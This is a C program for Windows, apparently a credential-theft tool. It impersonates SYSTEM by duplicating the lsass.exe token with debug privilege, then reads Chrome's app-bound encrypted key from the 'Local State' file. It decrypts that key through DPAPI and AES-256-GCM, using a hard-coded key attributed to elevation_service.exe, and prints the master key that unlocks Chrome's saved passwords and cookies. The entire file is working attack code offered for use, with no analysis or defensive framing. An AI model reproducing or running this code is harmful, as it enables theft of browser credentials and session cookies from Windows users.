#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <PathCch.h>
#include <tchar.h>
#include <string.h>
#include <openssl/evp.h>
#include <openssl/err.h>

#pragma comment(lib, "Pathcch.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Crypt32.lib")

#pragma comment(lib, "libcrypto.lib")
#pragma comment(lib, "libssl.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "User32.lib")


#define SE_DEBUG_PRIVILEGE 20
#define MAX_PATH_LENGTH 256
#define MAX_LINE_LENGTH 2048
#define IV_SIZE 12

typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
pdef_RtlAdjustPrivilege RtlAdjustPrivilege;

BOOL EnablePrivilege()
{
    HINSTANCE ntdll = LoadLibraryW(L"ntdll.dll");
    if (ntdll != NULL) {
        RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
        if (RtlAdjustPrivilege == NULL) {
            FreeLibrary(ntdll);
            return FALSE;
        }

        BOOLEAN enabled;
        NTSTATUS status = RtlAdjustPrivilege(20, TRUE, FALSE, &enabled);
        FreeLibrary(ntdll);
        
        return status == 0;
    }
    return FALSE;
}

HANDLE CheckProcesses()
{
    HANDLE hProcessSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnapShot != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hProcessSnapShot, &pe32))
        {
            do {
                if (!strcmp(pe32.szExeFile, "lsass.exe"))
                {
                    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
                    if (hProcess)
                    {
                        WCHAR ExecutableFilePath[MAX_PATH];
                        if (GetModuleFileNameExW(hProcess, 0, ExecutableFilePath, MAX_PATH))
                        {
                            return hProcess;
                        }
                        CloseHandle(hProcess);
                    }
                    else
                    {
                        return NULL;
                    }
                }
            } while (Process32Next(hProcessSnapShot, &pe32));
        }
        CloseHandle(hProcessSnapShot); 
        return NULL;
    }
    return NULL;
}

HANDLE GetSystemToken()
{
    HANDLE proc_h = CheckProcesses();
    HANDLE hToken = NULL;

    if (!EnablePrivilege())
    {
        return NULL;
    }

    if (!OpenProcessToken(proc_h, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken))
    {
        return NULL;
    }

    HANDLE duplicated_token = NULL;
    if (!DuplicateToken(hToken, SecurityImpersonation, &duplicated_token))
    {
        CloseHandle(hToken); 
        return NULL;
    }

    CloseHandle(hToken);
    return duplicated_token;
}

char* getEncryptionKey(const char* encryption_key_path) {
    FILE* encryption_key_file = fopen(encryption_key_path, "r");
    if (encryption_key_file == NULL) {
        printf("Error opening encryption_key_file: ");
        return NULL;
    }

    char buffer[MAX_LINE_LENGTH];
    char* key = NULL; // Define key pointer
    long offset = 0;

    while (fgets(buffer, MAX_LINE_LENGTH, encryption_key_file) != NULL) {
        // Find the position of "encrypted_key"
        char* key_start = strstr(buffer, "\"app_bound_encrypted_key\":\"");
        if (key_start != NULL) {
            // Calculate the offset from the beginning of the file
            offset += key_start - buffer; // Offset within the current buffer
            // Seek to the position of "encrypted_key" within the file
            fseek(encryption_key_file, offset, SEEK_SET);
            // Allocate memory for the key
            key = (char*)malloc(MAX_LINE_LENGTH); // Max key length
            if (key == NULL) {
                printf("Error: Memory allocation failed.\n");
                fclose(encryption_key_file);
                return NULL;
            }
            // Read the key value directly from the file
            if (fgets(key, MAX_LINE_LENGTH, encryption_key_file) == NULL) {
                printf("Error reading key value.\n");
                fclose(encryption_key_file);
                free(key); // Free memory in case of error
                return NULL;
            }
            
            break; // Exit the loop once key is found
        }
        // Update offset for the next iteration
        offset += strlen(buffer);
    }
    // If the key is not found
    fclose(encryption_key_file);
    return key;
}

BYTE* base64decode(const char* base64_encoded_key, DWORD* decoded_length) {
    DWORD input_length = strlen(base64_encoded_key);
    DWORD output_length;

    // Pass NULL as the first parameter to obtain the required output length
    CryptStringToBinaryA(base64_encoded_key, input_length, CRYPT_STRING_BASE64, NULL, &output_length, NULL, NULL);

    // Allocate memory for decoded data
    BYTE* decoded_data = (BYTE*)malloc(output_length);
    if (decoded_data == NULL) {
        printf("Error allocating memory for decoded_data.\n");
        return NULL;
    }

    // Decode Base64 encoded string
    if (!CryptStringToBinaryA(base64_encoded_key, input_length, CRYPT_STRING_BASE64, decoded_data, &output_length, NULL, NULL)) {
        printf("Base64 decoding failed.\n");
        free(decoded_data); // Free memory before returning NULL
        return NULL;
    }

    // Update decoded length
    *decoded_length = output_length;

    return decoded_data;
}

DATA_BLOB decryptData(const char* encryptedData, DWORD encryptedDataLength) {

    DATA_BLOB encryptedBlob;
    DATA_BLOB decryptedBlob = { 0 };

    encryptedBlob.cbData = encryptedDataLength;
    encryptedBlob.pbData = (BYTE*)encryptedData;

    BYTE* decoded_data = (BYTE*)malloc(encryptedDataLength);
    if (decoded_data == NULL) {
        printf("Error allocating memory for decoded_data.\n");
        return decryptedBlob;
    }

    encryptedBlob.cbData -= 4;
    encryptedBlob.pbData += 4;

    if (CryptUnprotectData(&encryptedBlob, NULL, NULL, NULL, NULL, 0, &decryptedBlob)) {
        return decryptedBlob;
    }
    else {
        // Decryption failed
        printf("Error decrypting data: ");
        printf("%lu", GetLastError());
        return decryptedBlob;
    }
}

void slice(BYTE* str, BYTE* result, DWORD start, DWORD end) {
    strncpy(result, str + start, end - start);
    result[end-start] = '\0';
}

BYTE* decrypt_key(const BYTE* decrypted_key, int total_length, const BYTE* aes_key, int* out_length)
{
    BYTE* iv = malloc(12);
    BYTE* ciphertext = malloc(32);
    BYTE* tag = malloc(16);

    slice((BYTE*)decrypted_key, iv, 1, 1 + 12);
    slice((BYTE*)decrypted_key, ciphertext, 1 + 12, 1 + 12 + 32);
    slice((BYTE*)decrypted_key, tag, 1 + 12 + 32, 1 + 12 + 32 + 16);

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        printf("error init ctx key");
        free(iv);
        free(ciphertext);
        free(tag);
        return NULL;
    }

    if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL)) {
        printf("error init decrypt key");
        EVP_CIPHER_CTX_free(ctx);
        free(iv);
        free(ciphertext);
        free(tag);
        return NULL;
    }

    if (1 != EVP_DecryptInit_ex(ctx, NULL, NULL, aes_key, iv)) {
        printf("error setup key and IV");
        EVP_CIPHER_CTX_free(ctx);
        free(iv);
        free(ciphertext);
        free(tag);
        return NULL;
    }

    if (1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, tag)) {
        printf("error setup tag");
        EVP_CIPHER_CTX_free(ctx);
        free(iv);
        free(ciphertext);
        free(tag);
        return NULL;
    }

    unsigned char* key = malloc(32);
    int len;
    if (1 != EVP_DecryptUpdate(ctx, key, &len, ciphertext, 32)) {
        printf("error decrypt key");
        EVP_CIPHER_CTX_free(ctx);
        free(iv);
        free(ciphertext);
        free(tag);
        free(key);
        return NULL;
    }

    if (1 != EVP_DecryptFinal_ex(ctx, key + len, &len)) {
        printf("error end decrypt key");
        EVP_CIPHER_CTX_free(ctx);
        free(iv);
        free(ciphertext);
        free(tag);
        free(key);
        return NULL;
    }

    EVP_CIPHER_CTX_free(ctx);
    free(tag);
    free(iv);
    free(ciphertext);
    key[32] = '\0';
    *out_length = strlen(key); // Len of key
    return key; 
}

void print_hex(BYTE* str) {
    while (*str) {
        printf("%02x", (unsigned char)*str);
        str++;
    }
    printf("\n");
}



int main()
{   
    EnablePrivilege();
    HANDLE Process = CheckProcesses();
    HANDLE duplicated_token = GetSystemToken();
    ImpersonateLoggedOnUser(duplicated_token);

    char* username = getenv("USERNAME");

    char encryption_key_path[MAX_PATH_LENGTH];
    snprintf(encryption_key_path, MAX_PATH_LENGTH, "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", username);
    char base64_key[2048];
    char* encryption_key = getEncryptionKey(encryption_key_path);
    char* base64_start = strstr(encryption_key, "\"app_bound_encrypted_key\":\"");
    
    if (base64_start != NULL) {
        base64_start += strlen("\"app_bound_encrypted_key\":\"");
        char* base64_end = strchr(base64_start, '\"');
        if (base64_end != NULL) {

            strncpy(base64_key, base64_start, base64_end - base64_start);
            base64_key[base64_end - base64_start] = '\0';
        }
        else 
        {
            printf("Value not found.\n");
            return 1;
        }
    }

    else 
    {
        printf("Key not found.\n");
        return 1;
    }

    DWORD decoded_length;
    BYTE* decoded_data = base64decode(base64_key, &decoded_length);
    DATA_BLOB masterkey;
    masterkey = decryptData(decoded_data, decoded_length);
    CloseHandle(duplicated_token);
    CloseHandle(Process);
    RevertToSelf();


    //                   decrypt with SYSTEM DPAPI
    DATA_BLOB decryptBlob = { 0 };
    DATA_BLOB encrptd;
    encrptd.cbData = masterkey.cbData; // lenght 
    encrptd.pbData = (BYTE*)masterkey.pbData; // data
    BOOL Unprotect;
    Unprotect = CryptUnprotectData(&encrptd, NULL, NULL, NULL, NULL, 0, &decryptBlob); // Unprotect data with wincrypt ((BYTE)decryptBlob.pbData == data, decryptBlob.cbData == (DWORD)lenght_data) 
    BYTE* DecryptedKey = malloc(100);
    slice(decryptBlob.pbData, DecryptedKey, decryptBlob.cbData-61, decryptBlob.cbData); // start X, end Y index
    DWORD DecryptedLenght;
    // decrypt key with AES256GCM
    // aes key from elevation_service.exe
    BYTE* aes_key = base64decode((const char*)"sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=", &DecryptedLenght); // aes key to decrypt data
    int key_length;
    BYTE* key = decrypt_key((const BYTE*)DecryptedKey, strlen(DecryptedKey), (const BYTE*)aes_key, &key_length);
    free(DecryptedKey);
    printf("Your key to decrypt chrome data: ");
    print_hex(key);
    
    return 0;
}